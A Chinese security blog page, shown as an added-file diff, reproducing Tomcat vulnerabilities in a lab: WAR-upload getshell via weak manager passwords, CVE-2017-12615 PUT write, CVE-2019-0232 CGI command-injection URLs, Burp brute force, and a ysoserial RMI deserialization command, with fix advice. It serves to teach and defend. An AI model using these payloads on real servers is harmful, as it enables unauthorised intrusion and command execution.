@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"aqyoung.github.io","root":"/","scheme":"Muse","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="中间件Tomcat漏洞的一次总结">
+<meta name="keywords" content="中间件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中间件漏洞之Tomcat">
+<meta property="og:url" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;2020&#x2F;04&#x2F;12&#x2F;%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat&#x2F;index.html">
+<meta property="og:site_name" content="AqYoung">
+<meta property="og:description" content="中间件Tomcat漏洞的一次总结">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;Tomcat.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;17.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;19.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;20.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;21.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;22.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;23.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;24.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;25.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;26.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;27.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;28.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;29.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;30.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;31.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;32.png">
+<meta property="og:updated_time" content="2020-04-16T13:37:08.230Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;aqyoung.github.io&#x2F;images&#x2F;tomcat&#x2F;Tomcat.png">
+
+<link rel="canonical" href="https://aqyoung.github.io/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>中间件漏洞之Tomcat | AqYoung</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">AqYoung</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">分享渗透知识与技巧</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://aqyoung.github.io/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="AqYoung">
+      <meta itemprop="description" content="努力将一切"Regular attacks"工程化！">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AqYoung">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          中间件漏洞之Tomcat
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-04-12 23:52:42" itemprop="dateCreated datePublished" datetime="2020-04-12T23:52:42+08:00">2020-04-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-16 21:37:08" itemprop="dateModified" datetime="2020-04-16T21:37:08+08:00">2020-04-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>中间件Tomcat漏洞的一次总结<a id="more"></a></p>
+<h1 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h1><blockquote>
+<p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
+</blockquote>
+<h1 id="Tomcat常见漏洞整理："><a href="#Tomcat常见漏洞整理：" class="headerlink" title="Tomcat常见漏洞整理："></a>Tomcat常见漏洞整理：</h1><p><img src="/images/tomcat/Tomcat.png" alt=""></p>
+<h2 id="后台弱口令上传war包Getshell漏洞"><a href="#后台弱口令上传war包Getshell漏洞" class="headerlink" title="后台弱口令上传war包Getshell漏洞"></a>后台弱口令上传war包Getshell漏洞</h2><p>1、修改conf/tomcat-users.xml文件的中配置用户的权限：<br><a href="http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html" target="_blank" rel="noopener">Configuring Manager Application Access</a></p>
+<pre><code>&lt;tomcat-users&gt;
+&lt;role rolename=&quot;manager-gui&quot;/&gt;
+&lt;role rolename=&quot;manager-script&quot;/&gt;
+&lt;role rolename=&quot;manager-jmx&quot;/&gt;
+&lt;role rolename=&quot;manager-status&quot;/&gt;
+&lt;role rolename=&quot;admin-gui&quot;/&gt;
+&lt;role rolename=&quot;admin-script&quot;/&gt;
+&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</code></pre><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
+<p>2、我们访问：</p>
+<pre><code>http://test.com:8080/manager/html/</code></pre><p>输入弱密码：tomcat：tomcat。登陆到后台</p>
+<p>3、选择一个jsp生成war包并且上传</p>
+<pre><code>jar -cvf job.war job.jsp
+or
+zip -r job.zip job.jsp &amp;&amp; mv job.zip job.war</code></pre><p><img src="/images/tomcat/1.png" alt=""></p>
+<p>上传成功我们可以看到返回包的路径</p>
+<p><img src="/images/tomcat/2.png" alt=""></p>
+<p>访问：</p>
+<pre><code>http://test.com:8080/上传war包名/文件名</code></pre><p>例如：</p>
+<pre><code>http://test.com:8080/job/job.jsp</code></pre><p><img src="/images/tomcat/3.png" alt=""></p>
+<h2 id="PUT方法任意文件写入（CVE-2017-12615）"><a href="#PUT方法任意文件写入（CVE-2017-12615）" class="headerlink" title="PUT方法任意文件写入（CVE-2017-12615）"></a>PUT方法任意文件写入（CVE-2017-12615）</h2><p>修改/conf/web.xml</p>
+<p><img src="/images/tomcat/5.png" alt=""></p>
+<p>直接PUT方法发送数据包即可在Web根目录写入shell：</p>
+<p>（readonly=false）<br><img src="/images/tomcat/4.png" alt=""></p>
+<p>成功写入文件，之后访问一下web根目录<br><img src="/images/tomcat/6.png" alt=""></p>
+<p>（readonly=true）<br><img src="/images/tomcat/7.png" alt=""></p>
+<p>更改配置之后返回403，不再可以写入<br><img src="/images/tomcat/8.png" alt=""></p>
+<h2 id="远程代码执行（CVE-2019-0232）"><a href="#远程代码执行（CVE-2019-0232）" class="headerlink" title="远程代码执行（CVE-2019-0232）"></a>远程代码执行（CVE-2019-0232）</h2><p>影响版本：</p>
+<pre><code>9.0.0.M1 ~ 9.0.17, 8.5.0 ~ 8.5.39 ， 7.0.0 ~ 7.0.93</code></pre><p>影响系统及条件：</p>
+<pre><code>Windows
+启用了CGI Servlet（默认为关闭）
+启用了enableCmdLineArguments（Tomcat 9.0.*及后续版本默认关闭）</code></pre><p>1、环境搭建：</p>
+<pre><code>#本次使用的环境为：
+Windows 10
+jre：1.8.0_241
+apache-tomcat-8.5.39</code></pre><p>（1）、启用CGI Servlet（修改conf/web.xml）</p>
+<p><img src="/images/tomcat/9.png" alt=""><br><img src="/images/tomcat/10.png" alt=""></p>
+<pre><code>&lt;init-param&gt;
+  &lt;param-name&gt;debug&lt;/param-name&gt;
+  &lt;param-value&gt;0&lt;/param-value&gt;
+&lt;/init-param&gt;
+&lt;init-param&gt;
+  &lt;param-name&gt;executable&lt;/param-name&gt;
+  &lt;param-value&gt;&lt;/param-value&gt;
+&lt;/init-param&gt;</code></pre><p>（2）、给予CGI_Servlet启动权限（修改conf/content.xml）</p>
+<p><img src="/images/tomcat/11.png" alt=""></p>
+<pre><code>&lt;Context privileged=&quot;true&quot;&gt;</code></pre><p>（3）、在webapps\ROOT\WEB-INF新建一个cgi目录（这个取决于<br>cgiPathPrefix的param-value的值”WEB-INF/cgi”）然后新建一个test.bat内容任意。</p>
+<p><img src="/images/tomcat/12.png" alt=""></p>
+<p>2、漏洞复现：</p>
+<p>payload：</p>
+<pre><code>http://localhost:8080/cgi-bin/test.bat?&amp;dir</code></pre><p><img src="/images/tomcat/13.png" alt=""></p>
+<pre><code>http://localhost:8080/cgi-bin/test.bat?&amp;C:/WINDOWS/system32/net+user</code></pre><p><img src="/images/tomcat/14.png" alt=""></p>
+<p>3、修复建议：</p>
+<pre><code>1、安装Apache Tomcat官方补丁升级进行防护
+2、将CGI Servlet初始化参数enableCmdLineArguments设置为false</code></pre><h2 id="manager-暴力破解（burp）"><a href="#manager-暴力破解（burp）" class="headerlink" title="manager 暴力破解（burp）"></a>manager 暴力破解（burp）</h2><p>1、环境搭建</p>
+<p>添加如下代码：（在conf/tomcat-users.xml）</p>
+<p><img src="/images/tomcat/15.png" alt=""></p>
+<pre><code>&lt;role rolename=&quot;tomcat-gui&quot;/&gt;
+&lt;role rolename=&quot;manager-gui&quot;/&gt;
+&lt;role rolename=&quot;manager-script&quot;/&gt;
+&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui&quot;/&gt;
+&lt;user username=&quot;admin&quot; password=&quot;123456&quot; roles=&quot;tomcat-gui,manager-gui,manager-script&quot;/&gt;</code></pre><p>2、使用burp进行暴力破解:</p>
+<p>（1）、访问 <a href="http://localhost:8080/manager/html" target="_blank" rel="noopener">http://localhost:8080/manager/html</a> 截取如下包：</p>
+<p><img src="/images/tomcat/16.png" alt=""></p>
+<p>（2）、发送到intruder模块之后标记 dG9tY2F0OjEyMzQ1Ng</p>
+<pre><code>payload type选择custom iterator
+position 设置为3
+（其中第一个为用户字典）
+（第二个为：）
+（第三个为密码字典）</code></pre><p><img src="/images/tomcat/17.png" alt=""></p>
+<pre><code>最后添加如下rule和取消url编码</code></pre><p><img src="/images/tomcat/18.png" alt=""></p>
+<p>（3）、开始爆破之后成功返回 200<br><img src="/images/tomcat/19.png" alt=""></p>
+<p>进行解码<br><img src="/images/tomcat/20.png" alt=""></p>
+<p>3、修复建议：</p>
+<pre><code>如果没有必要取消manager功能
+设置复杂性高的密码
+设置manager只允许本地IP访问</code></pre><h2 id="反序列化漏洞-CVE-2016-8735"><a href="#反序列化漏洞-CVE-2016-8735" class="headerlink" title="反序列化漏洞(CVE-2016-8735)"></a>反序列化漏洞(CVE-2016-8735)</h2><p>影响版本：</p>
+<pre><code>9.0.0.M1 ~ 9.0.0.M11
+8.5.0 ~ 8.5.6
+8.0.0.RC1 ~ 8.0.38
+7.0.0 ~ 7.0.72
+6.0.0 ~ 6.0.47</code></pre><p>1、环境搭建：</p>
+<pre><code>#本次使用的环境为：
+Windows 7
+jre：1.7.0_80
+apache-tomcat-8.5.39</code></pre><p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR" target="_blank" rel="noopener">jre下载</a></p>
+<p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/" target="_blank" rel="noopener">tomcat下载</a></p>
+<p>（1）、启用JmxRemoteLifecycleListener功能监听（在conf/server.xml）</p>
+<p><img src="/images/tomcat/21.png" alt=""></p>
+<pre><code>&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</code></pre><p>(2)、下载对应版本的<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.39/bin/extras/" target="_blank" rel="noopener">catalina-jmx-remote.jar</a>包和<a href="https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9" target="_blank" rel="noopener">groovy-2.3.9.jar</a>包,放到tomcat的lib目录下。</p>
+<p>（3）、修改bin/catalina.bat，在Execute The Requested Command上面添加内容</p>
+<p><img src="/images/tomcat/22.png" alt=""></p>
+<pre><code>set CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false
+#后面两个false分别代表：指定不使用SSL通讯、指定不需要密码验证</code></pre><p>（4）、修改完成之后启动tomcat，查看10001和10002的RMI服务端口是否运行。</p>
+<p><img src="/images/tomcat/23.png" alt=""></p>
+<p>2、漏洞复现：</p>
+<p>使用<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>发送payload</p>
+<pre><code>java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.11.14 10001 Groovy1 calc.exe</code></pre><p><img src="/images/tomcat/24.png" alt=""></p>
+<p>成功弹出计算器（在使用jre-1.8.0_241的时候出现报错）</p>
+<p>另外，POC的编写可以参考：<a href="https://blog.spoock.com/2019/09/20/cve-2016-8735/" target="_blank" rel="noopener">https://blog.spoock.com/2019/09/20/cve-2016-8735/</a></p>
+<p>3、修复建议:</p>
+<pre><code>更新对应的版本；
+关闭JmxRemoteLifecycleListener功能，对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。</code></pre><h2 id="样例目录session操控漏洞"><a href="#样例目录session操控漏洞" class="headerlink" title="样例目录session操控漏洞"></a>样例目录session操控漏洞</h2><p>1、漏洞分析：</p>
+<p>在webapps\examples\servlets\sessions.html</p>
+<p><img src="/images/tomcat/25.png" alt=""></p>
+<pre><code>String dataName = request.getParameter(&amp;quot;&lt;font color=&quot;#009900&quot;&gt;dataName&lt;/font&gt;&amp;quot;);//获取dataname参数的值
+if (dataName != null &amp;amp;&amp;amp; dataName.length() &amp;gt; 0) {
+    String dataValue = request.getParameter(&amp;quot;&lt;font color=&quot;#009900&quot;&gt;dataValue&lt;/font&gt;&amp;quot;);//获取dataValue参数的值
+    session.setAttribute(dataName, dataValue);//将dataname和datavalue写入session
+}</code></pre><p>通过表单用户提交的name和value这两个参数值。由request.getParameter()函数来获取这两个值，然后通过session.setAttribute()传递给session。从而可以通过前端页面去控制session的值来获取管理员权限。</p>
+<p>2、环境搭建</p>
+<pre><code>#本次使用的环境
+jre：1.7.0_80
+apache-tomcat-8.5.39</code></pre><p>在webapps\examples新建三个页面模拟登陆页面操控session获取权限</p>
+<p><img src="/images/tomcat/26.png" alt=""><br><img src="/images/tomcat/27.png" alt=""><br><img src="/images/tomcat/28.png" alt=""></p>
+<p>3、复现过程</p>
+<p>（1）、访问登陆页面并抓包</p>
+<pre><code>http://192.168.11.14:8080/examples/index.jsp</code></pre><p>由于没有管理员的session所以被302重定向到了login.jsp</p>
+<p><img src="/images/tomcat/29.png" alt=""></p>
+<p>(2)、操作session进入后台</p>
+<p>打开：SessionExample</p>
+<pre><code>http://192.168.11.14:8080/examples/servlets/servlet/SessionExample</code></pre><p>输入login：admin并且提交</p>
+<p><img src="/images/tomcat/30.png" alt=""></p>
+<p>提交后提示已经写入sessio<br><img src="/images/tomcat/31.png" alt=""></p>
+<p>再次访问</p>
+<pre><code>http://192.168.11.14:8080/examples/index.jsp</code></pre><p>这个时候提示登陆成功<br><img src="/images/tomcat/32.png" alt=""></p>
+<h2 id="本地提权漏洞-CVE-2016-1240"><a href="#本地提权漏洞-CVE-2016-1240" class="headerlink" title="本地提权漏洞(CVE-2016-1240)"></a>本地提权漏洞(CVE-2016-1240)</h2><p>参考：<a href="https://www.jianshu.com/p/94e4feac245f" target="_blank" rel="noopener">https://www.jianshu.com/p/94e4feac245f</a></p>
+<hr>
+<ul>
+<li>笔者初衷用于分享与交流网络知识，若读者因此作出任何危害网络安全行为后果自负，与作者无关！</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>AqYoung
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://aqyoung.github.io/2020/04/12/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/" title="中间件漏洞之Tomcat">https://aqyoung.github.io/2020/04/12/中间件漏洞之Tomcat/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag"># 中间件</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/09/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BNginx/" rel="prev" title="中间件漏洞之Nginx">
+      <i class="fa fa-chevron-left"></i> 中间件漏洞之Nginx
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat简介"><span class="nav-number">1.</span> <span class="nav-text">Tomcat简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat常见漏洞整理："><span class="nav-number">2.</span> <span class="nav-text">Tomcat常见漏洞整理：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#后台弱口令上传war包Getshell漏洞"><span class="nav-number">2.1.</span> <span class="nav-text">后台弱口令上传war包Getshell漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT方法任意文件写入（CVE-2017-12615）"><span class="nav-number">2.2.</span> <span class="nav-text">PUT方法任意文件写入（CVE-2017-12615）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#远程代码执行（CVE-2019-0232）"><span class="nav-number">2.3.</span> <span class="nav-text">远程代码执行（CVE-2019-0232）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#manager-暴力破解（burp）"><span class="nav-number">2.4.</span> <span class="nav-text">manager 暴力破解（burp）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反序列化漏洞-CVE-2016-8735"><span class="nav-number">2.5.</span> <span class="nav-text">反序列化漏洞(CVE-2016-8735)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#样例目录session操控漏洞"><span class="nav-number">2.6.</span> <span class="nav-text">样例目录session操控漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地提权漏洞-CVE-2016-1240"><span class="nav-number">2.7.</span> <span class="nav-text">本地提权漏洞(CVE-2016-1240)</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AqYoung"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">AqYoung</p>
